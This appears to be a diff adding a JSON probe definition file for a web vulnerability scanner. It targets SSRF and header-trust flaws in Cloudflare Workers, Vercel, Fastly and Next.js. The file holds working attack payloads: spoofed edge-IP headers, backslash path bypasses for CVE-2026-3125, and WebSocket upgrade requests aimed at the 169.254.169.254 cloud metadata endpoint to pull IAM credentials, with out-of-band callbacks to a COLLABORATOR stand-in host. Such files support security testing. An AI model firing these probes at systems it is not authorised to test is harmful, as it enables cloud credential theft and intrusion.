@@ -1,0 +1,113 @@
+{
+  "category": "edge_worker_ssrf",
+  "description": "Cloudflare Worker / Vercel Edge / Fastly Compute internal-header trust + same-zone SSRF (2024-2025)",
+  "contexts": {
+    "internal_header_trust": {
+      "description": "Edge worker trusts CF-Connecting-IP / X-Vercel-Forwarded-For / Fastly-Client-IP supplied by caller — origin treats them as edge-injected",
+      "tech_match": ["cloudflare", "vercel", "fastly", "edge"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "X-Forwarded-For: 127.0.0.1\\r\\nCF-Connecting-IP: 127.0.0.1\\r\\nX-Vercel-Forwarded-For: 127.0.0.1",
+          "description": "If origin reflects/honors any of these, edge→origin trust boundary is broken",
+          "matchers": [
+            {"type": "reflection", "in": "body"},
+            {"type": "header_change", "headers": ["X-Forwarded-For"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "same_zone_metadata": {
+      "description": "Cloudflare Worker can fetch() any cf-* domain in same zone — metadata.cloudflare.com / colo internals reachable",
+      "tech_match": ["cloudflare-workers"],
+      "param_match": ["url", "fetch_url", "callback", "webhook"],
+      "probes": [
+        {
+          "payload": "https://metadata.cloudflare.com/",
+          "description": "Reach internal CF metadata via worker fetch",
+          "matchers": [
+            {"type": "word", "words": ["cf-ray", "cf-cache"], "condition": "or"},
+            {"type": "status", "status": [200], "condition": "and"}
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        }
+      ]
+    },
+    "opennext_cloudflare_cdn_cgi_backslash_norm_2026": {
+      "description": "CVE-2026-3125 (opennextjs-cloudflare < 1.17.1) — Cloudflare edge router string-matches /cdn-cgi/ prefix; a request to /cdn-cgi\\image/<url> does NOT match (raw \\ != /) and passes to the Worker. Inside the Worker, WHATWG URL constructor normalises \\ → /, so the path becomes /cdn-cgi/image/<url> and the OpenNext image handler fetches the attacker-supplied URL → SSRF + bypass of private /cdn-cgi/_next_cache asset privacy.",
+      "tech_match": ["cloudflare", "cloudflare-workers", "opennext", "opennextjs", "nextjs"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/cdn-cgi\\image/format=auto/https://COLLABORATOR/",
+          "description": "Raw backslash variant — edge prefix-match fails, worker normalises, fetches Collaborator. Primary positive: outbound DNS + HTTP from Cloudflare egress IP range.",
+          "matchers": [
+            {"type": "collaborator", "condition": "or"},
+            {"type": "header", "headers": ["cf-ray"], "condition": "and"},
+            {"type": "not_status", "status": [403, 404], "condition": "and"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {"COLLAB_REQUIRED": true, "path_override": true}
+        },
+        {
+          "payload": "/cdn-cgi%5Cimage/format=auto/https://COLLABORATOR/",
+          "description": "URL-encoded backslash (%5C) variant — some edge proxies decode before prefix-match, others don't. Run both to capture either-edge behaviour.",
+          "matchers": [
+            {"type": "collaborator", "condition": "or"},
+            {"type": "header", "headers": ["cf-ray"], "condition": "and"},
+            {"type": "not_status", "status": [403, 404], "condition": "and"}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65,
+          "variables": {"COLLAB_REQUIRED": true, "path_override": true}
+        },
+        {
+          "payload": "/cdn-cgi\\_next_cache/<private-asset-path>",
+          "description": "Cache-asset privacy bypass variant — same normalisation flaw lets an unauth caller read the Worker's private prerender cache. Differential vs /cdn-cgi/_next_cache baseline reveals the bypass.",
+          "matchers": [
+            {"type": "length_delta", "min_diff": 256},
+            {"type": "status", "status": [200, 206], "condition": "and"},
+            {"type": "not_header", "headers": ["x-nextjs-cache"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {"path_override": true, "needs_baseline": true}
+        }
+      ]
+    },
+    "nextjs_websocket_upgrade_ssrf_2026": {
+      "description": "CVE-2026-44578 — self-hosted Next.js (Node.js server) SSRF via WebSocket upgrade handling. Remote unauthenticated attacker sends a crafted Upgrade: websocket request, causing the Next.js server to proxy the connection to arbitrary internal or external destinations. Effective for IMDS / internal-service / Collaborator pivot from the server's network position. Pre-auth.",
+      "tech_match": ["next.js", "nextjs", "vercel-self-hosted", "node.js"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "Upgrade: websocket\\r\\nConnection: upgrade\\r\\nHost: 169.254.169.254\\r\\nSec-WebSocket-Version: 13\\r\\nSec-WebSocket-Key: dGVzdGtleS0xMjM0NTY3OA==",
+          "description": "Craft a WebSocket upgrade with Host pointing at IMDS. On vulnerable Next.js the server proxies and IMDS response surfaces. Manual chain — operator constructs via send_raw_request with unsafe_headers=True so Host flows through.",
+          "matchers": [
+            {"type": "word", "words": ["ami-id", "iam/security-credentials", "AccessKeyId"], "condition": "or"},
+            {"type": "status", "status": [101, 200]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {"manual_chain": true, "needs_unsafe_headers": true}
+        },
+        {
+          "payload": "Upgrade: websocket\\r\\nConnection: upgrade\\r\\nHost: COLLABORATOR\\r\\nSec-WebSocket-Version: 13\\r\\nSec-WebSocket-Key: dGVzdGtleS0xMjM0NTY3OA==",
+          "description": "Collaborator canary variant — proxy hits Collaborator → blind SSRF confirmed via interaction polling.",
+          "matchers": [
+            {"type": "collaborator", "interaction_types": ["HTTP", "DNS"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {"manual_chain": true, "requires_collaborator": true, "needs_unsafe_headers": true}
+        }
+      ]
+    }
+  }
+}
